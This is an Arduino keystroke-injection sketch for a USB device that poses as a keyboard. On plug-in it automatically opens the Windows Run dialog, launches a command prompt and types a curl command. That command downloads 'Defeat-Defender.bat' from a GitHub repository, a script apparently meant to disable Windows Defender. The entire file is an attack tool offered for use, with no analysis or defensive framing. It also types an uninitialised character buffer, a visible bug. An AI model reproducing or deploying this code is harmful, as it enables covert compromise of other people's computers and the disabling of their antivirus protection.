#include <Wire.h>
#include <Keyboard.h>

void setup() {
  // put your setup code here, to run once:
  pwn();
}

void loop() {
  // put your main code here, to run repeatedly:

}

void key(int KEY, int MODIFIER)
{
  Keyboard.set_modifier(MODIFIER);
  Keyboard.set_key1(KEY);
  Keyboard.send_now();
  delay(20);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(20);
}

void openapp(String app)
{
  // Windows Key + R to open Run
  key(KEY_R , KEY_LEFT_GUI);
  delay(1500);


  // Type the App you want to open
  Keyboard.print(app);
  key(KEY_ENTER, 0);
  Keyboard.send_now();
  delay(1500);
}

void pwn() {
  char str[10];

  // Win+r "cmd" entrer
  openapp("cmd");
  delay(500);
  Keyboard.print(str);
  key(KEY_ENTER, 0);
  Keyboard.send_now();

  Keyboard.println("curl -O https://raw.githubusercontent.com/swagkarna/Defeat-Defender-V1.2.0/main/Defeat-Defender.bat");
}